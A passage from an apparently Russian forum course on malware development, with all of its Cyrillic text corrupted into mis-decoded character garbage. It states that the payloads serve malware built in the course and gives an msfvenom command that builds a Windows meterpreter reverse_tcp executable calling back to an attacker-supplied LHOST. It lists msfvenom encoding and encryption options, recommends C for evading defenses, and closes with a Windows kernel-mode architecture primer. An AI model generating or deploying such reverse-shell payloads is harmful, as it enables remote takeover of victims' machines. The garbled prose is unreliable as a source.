–≠—Ç–∏ –Ω–∞–≥—Ä—É–∑–∫–∏ –±—É–¥—É—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è –≤ —Å–æ–∑–¥–∞–≤–∞–µ–º–æ–º –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–º –ø—Ä–æ–≥—Ä–∞–º–º–Ω–æ–º –æ–±–µ—Å–ø–µ—á–µ–Ω–∏–∏ –≤ —Ä–∞–º–∫–∞—Ö –¥–∞–Ω–Ω–æ–≥–æ –∫—É—Ä—Å–∞.<br />
<br />
–¢–∞–∫–∂–µ —è–≤–ª—è–µ—Ç—Å—è –∑–∞–º–µ–Ω–æ–π –¥–ª—è –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–æ–≤ msfpayload –∏ msfencode.<br />
<br />
–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: /usr/bin/msfvenom [–æ–ø—Ü–∏–∏] &lt;var=val&gt;<br />
<br />
–ü—Ä–∏–º–µ—Ä: /usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP&gt; -f exe -o payload.exe<br />
<br />
–û–ø—Ü–∏–∏:<br />
<br />


<details class="spoiler">
  <summary>–°–ø–æ–π–ª–µ—Ä: –û–ø—Ü–∏–∏</summary>
  <div>
-1, --list &lt;type&gt; –°–ø–∏—Å–æ–∫ –≤—Å–µ—Ö –º–æ–¥—É–ª–µ–π.<br />
<br />
–¢–∏–ø—ã: payloads, encoders, nops, platforms, archs, encrypt, formats, all.<br />
<br />
-p, --payload &lt;payload&gt; –ò—Å–ø–æ–ª—å–∑—É–µ–º–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ (–∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ --list payloads –¥–ª—è –ø—Ä–æ—Å–º–æ—Ç—Ä–∞ —Å–ø–∏—Å–∫–∞, --list-options –¥–ª—è –∞—Ä–≥—É–º–µ–Ω—Ç–æ–≤).<br />
<br />
--list-options –°–ø–∏—Å–æ–∫ —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã—Ö, —Ä–∞—Å—à–∏—Ä–µ–Ω–Ω—ã—Ö –æ–ø—Ü–∏–π –¥–ª—è --payload &lt;value&gt;.<br />
<br />
-f, --format &lt;format&gt; –§–æ—Ä–º–∞—Ç –≤—ã–≤–æ–¥–∞ (–∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ --list formats –¥–ª—è —Å–ø–∏—Å–∫–∞ —Ñ–æ—Ä–º–∞—Ç–æ–≤).<br />
<br />
-e, --encoder &lt;encoder&gt; –ò—Å–ø–æ–ª—å–∑—É–µ–º—ã–π —ç–Ω–∫–æ–¥–µ—Ä (–∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ --list encoders –¥–ª—è –ø—Ä–æ—Å–º–æ—Ç—Ä–∞ —Å–ø–∏—Å–∫–∞).<br />
<br />
--service-name &lt;value&gt; –ò–º—è —Å–ª—É–∂–±—ã –ø—Ä–∏ —Å–æ–∑–¥–∞–Ω–∏–∏ –∏—Å–ø–æ–ª–Ω—è–µ–º–æ–≥–æ —Ñ–∞–π–ª–∞ —Å–ª—É–∂–±—ã.<br />
<br />
--sec-name &lt;value&gt; –ù–æ–≤–æ–µ –∏–º—è —Ä–∞–∑–¥–µ–ª–∞ –ø—Ä–∏ —Å–æ–∑–¥–∞–Ω–∏–∏ –∫—Ä—É–ø–Ω—ã—Ö –∏—Å–ø–æ–ª–Ω—è–µ–º—ã—Ö —Ñ–∞–π–ª–æ–≤ –¥–ª—è Windows. –ü–æ —É–º–æ–ª—á–∞–Ω–∏—é: —Å–ª—É—á–∞–π–Ω–∞—è —Å—Ç—Ä–æ–∫–∞ –∏–∑ 4 —Å–∏–º–≤–æ–ª–æ–≤.<br />
<br />
--smallest –ì–µ–Ω–µ—Ä–∞—Ü–∏—è –Ω–∞–∏–º–µ–Ω—å—à–µ–π –≤–æ–∑–º–æ–∂–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏, –∏—Å–ø–æ–ª—å–∑—É—è –≤—Å–µ –¥–æ—Å—Ç—É–ø–Ω—ã–µ —ç–Ω–∫–æ–¥–µ—Ä—ã.<br />
<br />
--encrypt &lt;value&gt; –¢–∏–ø —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è –∏–ª–∏ –∫–æ–¥–∏—Ä–æ–≤–∞–Ω–∏—è –¥–ª—è –ø—Ä–∏–º–µ–Ω–µ–Ω–∏—è –∫ –∫–æ–¥—É –æ–±–æ–ª–æ—á–∫–∏ (–∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ --list encrypt –¥–ª—è —Å–ø–∏—Å–∫–∞).<br />
<br />
--encrypt-key &lt;value&gt; –ö–ª—é—á –¥–ª—è --encrypt.<br />
<br />
--encrypt-iv &lt;value&gt; –í–µ–∫—Ç–æ—Ä –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏ –¥–ª—è --encrypt.<br />
<br />
-a, --arch &lt;arch&gt; –ê—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–∞ –¥–ª—è --payload –∏ --encoders (–∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ --list archs –¥–ª—è —Å–ø–∏—Å–∫–∞).<br />
<br />
--platform &lt;platform&gt; –ü–ª–∞—Ç—Ñ–æ—Ä–º–∞ –¥–ª—è --payload (–∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ --list platforms –¥–ª—è —Å–ø–∏—Å–∫–∞).<br />
<br />
-o, --out &lt;path&gt; –°–æ—Ö—Ä–∞–Ω–∏—Ç—å –Ω–∞–≥—Ä—É–∑–∫—É –≤ —Ñ–∞–π–ª.<br />
<br />
-b, --bad-chars &lt;list&gt; –°–ø–∏—Å–æ–∫ —Å–∏–º–≤–æ–ª–æ–≤, –∫–æ—Ç–æ—Ä—ã—Ö –Ω—É–∂–Ω–æ –∏–∑–±–µ–≥–∞—Ç—å. –ü—Ä–∏–º–µ—Ä: &#039;\—Ö@@\—Ö –†&#039;.<br />
<br />
-n, --nopsled &lt;length&gt; –î–æ–±–∞–≤–∏—Ç—å –ø—É—Å—Ç–æ–π –±–ª–æ–∫ –∑–∞–¥–∞–Ω–Ω–æ–π –¥–ª–∏–Ω—ã –ø–µ—Ä–µ–¥ –Ω–∞–≥—Ä—É–∑–∫–æ–π.<br />
<br />
--pad-nops –ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –¥–ª–∏–Ω—É –±–ª–æ–∫–∞, –∑–∞–¥–∞–Ω–Ω—É—é –æ–ø—Ü–∏–µ–π -n &lt;length&gt;, –∫–∞–∫ –æ–±—â–∏–π —Ä–∞–∑–º–µ—Ä –Ω–∞–≥—Ä—É–∑–∫–∏, –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –¥–æ–±–∞–≤–ª—è—è –ø—É—Å—Ç–æ–π –±–ª–æ–∫ –¥–æ –Ω—É–∂–Ω–æ–≥–æ –∫–æ–ª–∏—á–µ—Å—Ç–≤–∞ (–¥–ª–∏–Ω–∞ –±–ª–æ–∫–∞ –º–∏–Ω—É—Å –¥–ª–∏–Ω–∞ –Ω–∞–≥—Ä—É–∑–∫–∏).<br />
<br />
-s, --space &lt;length&gt; –ú–∞–∫—Å–∏–º–∞–ª—å–Ω—ã–π —Ä–∞–∑–º–µ—Ä —Ä–µ–∑—É–ª—å—Ç–∏—Ä—É—é—â–µ–π –Ω–∞–≥—Ä—É–∑–∫–∏.<br />
<br />
--encoder-space &lt;length&gt; –ú–∞–∫—Å–∏–º–∞–ª—å–Ω—ã–π —Ä–∞–∑–º–µ—Ä –∑–∞–∫–æ–¥–∏—Ä–æ–≤–∞–Ω–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏ (–ø–æ —É–º–æ–ª—á–∞–Ω–∏—é —Ä–∞–≤–µ–Ω –∑–Ω–∞—á–µ–Ω–∏—é –æ–ø—Ü–∏–∏ -s).<br />
<br />
-i, --iterations &lt;count&gt; –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –∏—Ç–µ—Ä–∞—Ü–∏–π –∫–æ–¥–∏—Ä–æ–≤–∞–Ω–∏—è –Ω–∞–≥—Ä—É–∑–∫–∏.<br />
<br />
-c, --add-code &lt;path&gt; –£–∫–∞–∑–∞—Ç—å –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–π —Ñ–∞–π–ª —Å shell-–∫–æ–¥–æ–º –¥–ª—è –≤–∫–ª—é—á–µ–Ω–∏—è.<br />
<br />
-x, --template &lt;path&gt; –£–∫–∞–∑–∞—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏–π –∏—Å–ø–æ–ª–Ω—è–µ–º—ã–π —Ñ–∞–π–ª –≤ –∫–∞—á–µ—Å—Ç–≤–µ —à–∞–±–ª–æ–Ω–∞.
  </div>
</details></div><br />
<b>–ü–æ–∂–∞–ª—É–π—Å—Ç–∞ –∏–∑—É—á–∏—Ç–µ —ç—Ç–∏ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ã –±–æ–ª–µ–µ –ø–æ–¥—Ä–æ–±–Ω–æ —Å–∞–º–æ—Å—Ç–æ—è—Ç–µ–ª—å–Ω–æ, –∫ —Å–æ–∂–∞–ª–µ–Ω–∏—é –æ–ø–∏—Å—ã–≤–∞—Ç—å –∏—Ö –±–æ–ª–µ–µ –¥–µ—Ç–∞–ª—å–Ω–æ –Ω–µ—Ç –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç–∏, –≤ —Å–µ—Ç–∏ —Å—Ç–∞—Ç–µ–π –æ—á–µ–Ω—å –º–Ω–æ–≥–æ, –¥–∞–ª–µ–µ –≤ —Å–ª–µ–¥—É—é—â–∏—Ö —Å—Ç–∞—Ç—å—è—Ö –±—É–¥–µ—Ç –∑–∞—Ç—Ä–æ–Ω—É—Ç –Ω–µ–º–Ω–æ–≥–æ —è–∑—ã–∫ –°–∏, –∞ –ø–æ—Ç–æ–º –Ω–µ–º–Ω–æ–≥–æ –∞—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–∞ –û–°.<br />
<br />
–í–æ–æ–±—â–µ –æ–ø–∏—Å—ã–≤–∞—Ç—å –≤—Å—ë –ø–æ–¥—Ä–æ–±–Ω–æ –æ—á–µ–Ω—å –∑–∞—Ç—Ä–∞—Ç–Ω–æ, –ø–æ—ç—Ç–æ–º—É —Ü–µ–ª—å —ç—Ç–∏—Ö —Å—Ç–∞—Ç–µ–π –¥–∞—Ç—å –Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ, –µ—Å–ª–∏-–∂–µ –≤—ã –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω–æ —Ö–æ—Ç–∏—Ç–µ —á—Ç–æ-—Ç–æ –∏–∑—É—á–∞—Ç—å, —Ç–æ —ç—Ç–æ –≤ –æ—Å–Ω–æ–≤–Ω–æ–º —Å–∞–º–æ—Å—Ç–æ—è—Ç–µ–ª—å–Ω–∞—è –ø—Ä–∞–∫—Ç–∏–∫–∞ –∏ –∏–∑—É—á–µ–Ω–∏–µ.<br />
<br />
–ù–æ –Ω–∞–¥–µ—é—Å—å —ç—Ç–∏ —Å—Ç–∞—Ç—å–∏ –º–æ–≥—É—Ç –¥–∞—Ç—å –∫–∞–∫–æ–µ-—Ç–æ –Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ‚Ä¶)</b></div>
						

							<h2>–¢–∞–∫ –∫–∞–∫–æ–π-–∂–µ —è–∑—ã–∫ –≤—ã–±—Ä–∞—Ç—å !?</h2>

							

							

							<div class="bbWrapper"><div class="bbImageWrapper  js-lbImage" title="1746708542332.png"
		data-src="https://osint42.org/attachments/1746708542332-png.26/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746708542332-png.26/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746708542332.png"
			title="1746708542332.png"
			width="1222" height="650" loading="lazy" />
	</div><br />
<br />
–í–æ–æ–±—â–µ –≤ —Å–µ—Ç–∏ –º–Ω–æ–≥–æ —Ö–æ–ª–∏–≤–∞—Ä–æ–≤ –Ω–∞ —ç—Ç—É —Ç–µ–º—É.<br />
<br />
–ú–Ω–æ–≥–∏–µ –ø—Ä–µ–¥—Å—Ç–∞–≤–∏—Ç–µ–ª–∏ —Å—Ç–∞—Ä–æ–π —à–∫–æ–ª—ã –æ—Ç–∫–∞–∑—ã–≤–∞—é—Ç—Å—è –ø—Ä–∏–∑–Ω–∞–≤–∞—Ç—å –Ω–æ–≤—ã–µ —Ç–µ—Ö–Ω–æ–ª–æ–≥–∏–∏ –∏ —Å—á–∏—Ç–∞—é—Ç —Ä–∞–∑—Ä–∞–±–æ—Ç–∫—É –º–∞–ª–≤–∞—Ä–∏, –∫–∞–∫ –Ω–∏–∑–∫–æ—É—Ä–æ–≤–Ω–µ–≤—É—é —Ä–∞–∑—Ä–∞–±–æ—Ç–∫—É, —Ç.–µ. —á—Ç–æ-—Ç–æ —Ç–∞–º –Ω–∞ —É—Ä–æ–≤–Ω–µ –¥—Ä–∞–π–≤–µ—Ä–æ–≤ —Å–∏—Å—Ç–µ–º—ã, –∫–∞–∫–æ–µ-—Ç–æ –∞–ø–ø–∞—Ä–∞—Ç–Ω–æ–µ –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏–µ –Ω–∏–∑–∫–æ—É—Ä–æ–≤–Ω–µ–≤–æ–µ, –Ω–∞–ø—Ä–∏–º–µ—Ä —Ä–∞–±–æ—Ç–∞ —Å –ø—Ä–æ—Ü–µ—Å—Å–æ—Ä–æ–º, —Ä–µ–≤–µ—Ä—Å –∏ —Ç.–¥.<br />
<br />
–î–∞, –≤—Å—ë —ç—Ç–æ –º–æ–∂–µ—Ç –ø—Ä–∏—Å—É—Ç—Å—Ç–≤–æ–≤–∞—Ç—å –≤ —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–µ, <b>–Ω–æ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –ø–æ–Ω–∏–º–∞—Ç—å, —á—Ç–æ –º–∞–ª–≤–∞—Ä—å —Å–µ–π—á–∞—Å –≤–µ—Å—å–º–∞ –æ–±—à–∏—Ä–Ω–æ–µ –ø–æ–Ω—è—Ç–∏–µ.<br />
<br />
–í –æ–±—â–µ–º —è —Å—á–∏—Ç–∞—é, —á—Ç–æ —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–∞ –º–∞–ª–≤–∞—Ä–∏, —ç—Ç–æ <u>—Å–∏—Å—Ç–µ–º–Ω–∞—è —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–∞, </u></b>–Ω—É —Ç.–µ. –Ω—É–∂–Ω–æ –ø–æ–Ω–∏–º–∞—Ç—å –≤ —Ü–µ–ª–æ–º –∫–∞–∫ —Ä–∞–±–æ—Ç–∞–µ—Ç —Å–∏—Å—Ç–µ–º–∞, –æ–±–ª–∞–¥–∞—Ç—å –±–æ–ª–µ–µ –≥–ª—É–±–æ–∫–∏–º–∏ –∑–Ω–∞–Ω–∏—è–º–∏ –≤ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ –û–°.<br />
<br />
–ê –≤–æ—Ç —Å –≤—ã–±–æ—Ä–æ–º —è–∑—ã–∫–∞ —Ç—É—Ç –≤—Å—ë –∑–∞–≤–∏—Å–∏—Ç –æ—Ç —Å–∞–º–æ–π –∑–∞–¥–∞—á–∏, –∑–Ω–∞–Ω–∏–π —è–∑—ã–∫–∞ –∏ —Ç.–¥.<br />
<br />
–ï—â—ë —Ö–æ—á–µ—Ç—Å—è –æ—Ç–º–µ—Ç–∏—Ç—å, —á—Ç–æ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç –º–Ω–æ–≥–æ –Ω–∞—Ä–∞–±–æ—Ç–æ–∫ —É–∂–µ –∏ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–æ–≤ –Ω–∞ —Ä–∞–∑–Ω—ã—Ö —è–∑—ã–∫–∞—Ö, —ç—Ç–∏–º–∏ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∞–º–∏ —Ç–æ–∂–µ –Ω—É–∂–Ω–æ —É–º–µ—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è.)<br />
<br />
–í–æ—Ç –Ω—É –∏ –ø–æ—Å–ª–µ–¥–Ω–µ–µ –Ω–∞–≤–µ—Ä–Ω–æ–µ, –µ—Å–ª–∏ –ø–æ—á–∏—Ç–∞—Ç—å —ç—Ç–æ—Ç —Ñ–æ—Ä—É–º, —Ç–æ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è —è–∑—ã–∫ –°–∏ –≤ –æ—Å–Ω–æ–≤–Ω–æ–º, –ø—Ä–∏—á–∏–Ω —ç—Ç–æ–º—É –Ω–µ—Å–∫–æ–ª—å–∫–æ:<br />
<br />
1. –¢—É—Ç –≤ –æ—Å–Ω–æ–≤–Ω–æ–º –∏–∑—É—á–µ–Ω–∏–µ –æ–±—Ö–æ–¥–∞ —Å—Ä–µ–¥—Å—Ç–≤ –∑–∞—â–∏—Ç—ã –∏ —Ç.–¥., –ø–æ—ç—Ç–æ–º—É —è–∑—ã–∫ –°–∏ –±–æ–ª–µ–µ –ø—Ä–µ–¥–ø–æ—á—Ç–∏—Ç–µ–ª–µ–Ω, —Ç.–∫. –Ω–µ—Ç –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–π —Ä–∞–±–æ—Ç—ã —Å –ø–∞–º—è—Ç—å—é –∏ —Ç.–¥.<br />
2. –ü—Ä–æ–≥—Ä–∞–º–º—ã —Å–æ–±—Ä–∞–Ω–Ω—ã–µ –∫–æ–º–ø–∏–ª—è—Ç–æ—Ä–æ–º –°–∏ –ª–µ–≥—á–µ –∏—Å—Å–ª–µ–¥–æ–≤–∞—Ç—å, –Ω–∞–ø—Ä–∏–º–µ—Ä –≤ —Ç–æ–º-–∂–µ –¥–∏–∑–∞—Å—Å–µ–º–±–ª–µ—Ä–µ.<br />
<br />
–ù–æ –ø–æ–Ω—è—Ç–Ω–æ —á—Ç–æ –∫—É—á–∞ –º–∏–Ω—É—Å–æ–≤ —ç—Ç–æ–≥–æ —è–∑—ã–∫–∞, –Ω–∞—á–∏–Ω–∞—è –æ—Ç –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –∏ –∑–∞–∫–∞–Ω—á–∏–≤–∞—è –æ—Ç—Å—É—Ç—Å—Ç–≤–∏–µ–º –∫–∞–∫–∏—Ö-—Ç–æ —Ñ–∏—à–µ–∫, –∫–∞–∫ –Ω–∞–ø—Ä–∏–º–µ—Ä –≤ –°++, —Ö–æ—Ç—è –µ—Å–ª–∏ –≥–æ–≤–æ—Ä–∏—Ç –ø—Ä–æ –°++ —Ç–∞–º —Ç–æ–∂–µ –µ—Å—Ç—å –Ω–µ –º–∞–ª–æ –º–∏–Ω—É—Å–æ–≤, –≤–∞–∂–Ω–∞ –ø—Ä–∞–∫—Ç–∏–∫–∞...)</div>
						

							<h2>–®–ø–∞—Ä–≥–∞–ª–∫–∞ –ø–æ –∞—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–µ –≤–∏–Ω–¥—ã</h2>

							

							

							<div class="bbWrapper">–ê—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–∞ –ª—é–±–æ–π –û–°, –æ—á–µ–Ω—å —Å–ª–æ–∂–Ω–∞—è —Å–∏—Å—Ç–µ–º–∞, —Ç–∞–∫ –Ω–∞—Å–∫–æ–∫–æ–º –Ω–µ –∏–∑—É—á–∏—à—å.<br />
<br />
–ù–æ —Ç.–∫. —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–∞ –º–∞–ª–≤–∞—Ä–∏ - –≠—Ç–æ —Å–∏—Å—Ç–µ–º–Ω–∞—è —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–∞, –∫–∞–∫–æ–µ-—Ç–æ –ø–æ–Ω–∏–º–∞–Ω–∏–µ —ç—Ç–æ–π —Å–∞–º–æ–π –∞—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä—ã –Ω—É–∂–Ω–æ –∏–º–µ—Ç—å, –ø–æ—ç—Ç–æ–º—É –¥–∞–Ω–Ω–∞—è —à–ø–∞—Ä–≥–∞–ª–∫–∞ –¥–∞—Å—Ç –Ω–µ–±–æ–ª—å—à–æ–µ –ø–æ–Ω–∏–º–∞–Ω–∏–µ, –Ω–æ –∫ —Å–æ–∂–∞–ª–µ–Ω–∏—é –Ω–µ –±–æ–ª–µ–µ —Ç–æ–≥–æ.<img src="../../../cdn.jsdelivr.net/joypixels/assets/8.0/png/unicode/64/1f641.png" class="smilie smilie--emoji" loading="lazy" width="64" height="64" alt=":(" title="Frown    :("  data-smilie="3"data-shortname=":(" /><br />
<br />
–ü—Ä–æ—Ü–µ—Å—Å–æ—Ä –≤–Ω—É—Ç—Ä–∏ –∫–æ–º–ø—å—é—Ç–µ—Ä–∞, –Ω–∞ –∫–æ—Ç–æ—Ä–æ–π —Ä–∞–±–æ—Ç–∞–µ—Ç –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–∞—è —Å–∏—Å—Ç–µ–º–∞ Windows, –º–æ–∂–µ—Ç —Ä–∞–±–æ—Ç–∞—Ç—å –≤ –¥–≤—É—Ö —Ä–∞–∑–Ω—ã—Ö —Ä–µ–∂–∏–º–∞—Ö: —Ä–µ–∂–∏–º–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏ —Ä–µ–∂–∏–º–µ —è–¥—Ä–∞.<br />
<br />
–ü—Ä–∏–ª–æ–∂–µ–Ω–∏—è —Ä–∞–±–æ—Ç–∞—é—Ç –≤ —Ä–µ–∂–∏–º–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è, –∞ –∫–æ–º–ø–æ–Ω–µ–Ω—Ç—ã –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º—ã —Ä–∞–±–æ—Ç–∞—é—Ç –≤ —Ä–µ–∂–∏–º–µ —è–¥—Ä–∞.<br />
<br />
–ö–æ–≥–¥–∞ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ —Ö–æ—á–µ—Ç –≤—ã–ø–æ–ª–Ω–∏—Ç—å –∑–∞–¥–∞—á—É, –Ω–∞–ø—Ä–∏–º–µ—Ä, —Å–æ–∑–¥–∞—Ç—å —Ñ–∞–π–ª, –æ–Ω–æ –Ω–µ –º–æ–∂–µ—Ç —Å–¥–µ–ª–∞—Ç—å —ç—Ç–æ —Å–∞–º–æ—Å—Ç–æ—è—Ç–µ–ª—å–Ω–æ.<br />
<br />
–ï–¥–∏–Ω—Å—Ç–≤–µ–Ω–Ω–∞—è —Å—É—â–Ω–æ—Å—Ç—å, –∫–æ—Ç–æ—Ä–∞—è –º–æ–∂–µ—Ç –≤—ã–ø–æ–ª–Ω–∏—Ç—å –∑–∞–¥–∞—á—É - —ç—Ç–æ —è–¥—Ä–æ, –ø–æ—ç—Ç–æ–º—É –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è –¥–æ–ª–∂–Ω—ã —Å–ª–µ–¥–æ–≤–∞—Ç—å –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω–æ–º—É –ø–æ—Ä—è–¥–∫—É –≤—ã–∑–æ–≤–∞ —Ñ—É–Ω–∫—Ü–∏–π.<br />
–ù–∏–∂–µ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–∞ –¥–∏–∞–≥—Ä–∞–º–º–∞, –ø–æ–∫–∞–∑—ã–≤–∞—é—â–∞—è –≤—ã—Å–æ–∫–∏–π —É—Ä–æ–≤–µ–Ω—å —ç—Ç–æ–≥–æ –ø–æ—Ç–æ–∫–∞.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746709115272.png"
		data-src="https://osint42.org/attachments/1746709115272-png.27/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746709115272-png.27/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746709115272.png"
			title="1746709115272.png"
			width="1140" height="569" loading="lazy" />
	</div><br />
<br />
<b>–ü—Ä–æ—Ü–µ—Å—Å—ã –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è:</b><br />
<ol>
<li data-xf-list-type="ol">–ü—Ä–æ—Ü–µ—Å—Å—ã –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è - —ç—Ç–æ –ø—Ä–æ–≥—Ä–∞–º–º–∞/–ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ, –≤—ã–ø–æ–ª–Ω–µ–Ω–Ω–æ–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º, —Ç–∞–∫–æ–µ –∫–∞–∫ Notepad, Google Chrome –∏–ª–∏ Microsoft Word.</li>
<li data-xf-list-type="ol">–ë–∏–±–ª–∏–æ—Ç–µ–∫–∏ DLL –ø–æ–¥—Å–∏—Å—Ç–µ–º—ã - DLL, –∫–æ—Ç–æ—Ä—ã–µ —Å–æ–¥–µ—Ä–∂–∞—Ç —Ñ—É–Ω–∫—Ü–∏–∏ API, –≤—ã–∑—ã–≤–∞–µ–º—ã–µ –ø—Ä–æ—Ü–µ—Å—Å–∞–º–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è. –ü—Ä–∏–º–µ—Ä–æ–º —ç—Ç–æ–≥–æ –º–æ–∂–µ—Ç —Å–ª—É–∂–∏—Ç—å kernel32.dll, —ç–∫—Å–ø–æ—Ä—Ç–∏—Ä—É—é—â–∞—è —Ñ—É–Ω–∫—Ü–∏—é CreateFile Windows API (WinAPI), –¥—Ä—É–≥–∏–º–∏ –æ–±—â–∏–º–∏ DLL –ø–æ–¥—Å–∏—Å—Ç–µ–º—ã —è–≤–ª—è—é—Ç—Å—è ntdll.dll, advapi32.dll –∏ user32.dll.</li>
<li data-xf-list-type="ol">Ntdll.dll - —ç—Ç–æ —Å–∏—Å—Ç–µ–º–Ω–∞—è DLL, –∫–æ—Ç–æ—Ä–∞—è —è–≤–ª—è–µ—Ç—Å—è —Å–∞–º—ã–º –Ω–∏–∑–∫–∏–º —Å–ª–æ–µ–º, –¥–æ—Å—Ç—É–ø–Ω—ã–º –≤ —Ä–µ–∂–∏–º–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è. –≠—Ç–æ —Å–ø–µ—Ü–∏–∞–ª—å–Ω–∞—è DLL, –∫–æ—Ç–æ—Ä–∞—è —Å–æ–∑–¥–∞–µ—Ç –ø–µ—Ä–µ—Ö–æ–¥ –∏–∑ —Ä–µ–∂–∏–º–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –≤ —Ä–µ–∂–∏–º —è–¥—Ä–∞. –≠—Ç–æ —á–∞—Å—Ç–æ –Ω–∞–∑—ã–≤–∞—é—Ç Native API –∏–ª–∏ NTAPI.</li>
<li data-xf-list-type="ol">Executive Kernel - —ç—Ç–æ —Ç–æ, —á—Ç–æ –∏–∑–≤–µ—Å—Ç–Ω–æ –∫–∞–∫ Windows Kernel, –∏ –æ–Ω–æ –≤—ã–∑—ã–≤–∞–µ—Ç –¥—Ä—É–≥–∏–µ –¥—Ä–∞–π–≤–µ—Ä—ã –∏ –º–æ–¥—É–ª–∏, –¥–æ—Å—Ç—É–ø–Ω—ã–µ –≤ —Ä–µ–∂–∏–º–µ —è–¥—Ä–∞, —á—Ç–æ–±—ã –≤—ã–ø–æ–ª–Ω–∏—Ç—å –∑–∞–¥–∞—á–∏. –Ø–¥—Ä–æ Windows —á–∞—Å—Ç–∏—á–Ω–æ —Ö—Ä–∞–Ω–∏—Ç—Å—è –≤ —Ñ–∞–π–ª–µ –ø–æ–¥ –Ω–∞–∑–≤–∞–Ω–∏–µ–º ntoskrnl.exe –ø–æ –ø—É—Ç–∏ &quot;C:\Windows\System32&quot;.</li>
</ol>–ù–∏–∂–µ –ø–æ–∫–∞–∑–∞–Ω –ø—Ä–∏–º–µ—Ä –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è, –∫–æ—Ç–æ—Ä–æ–µ —Å–æ–∑–¥–∞–µ—Ç —Ñ–∞–π–ª. –≠—Ç–æ –Ω–∞—á–∏–Ω–∞–µ—Ç—Å—è —Å –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è, –≤—ã–∑—ã–≤–∞—é—â–µ–≥–æ —Ñ—É–Ω–∫—Ü–∏—é createrFile WinAPI, –¥–æ—Å—Ç—É–ø–Ω—É—é –≤ kernel32.dll. Kernel32.dll - —ç—Ç–æ –≤–∞–∂–Ω–∞—è DLL, –∫–æ—Ç–æ—Ä–∞—è –æ—Ç–∫—Ä—ã–≤–∞–µ—Ç –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è–º –¥–æ—Å—Ç—É–ø –∫ WinAPI, –∏ –ø–æ—ç—Ç–æ–º—É –µ–µ –º–æ–∂–Ω–æ —É–≤–∏–¥–µ—Ç—å –∑–∞–≥—Ä—É–∂–µ–Ω–Ω–æ–π –±–æ–ª—å—à–∏–Ω—Å—Ç–≤–æ–º –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π.<br />
<br />
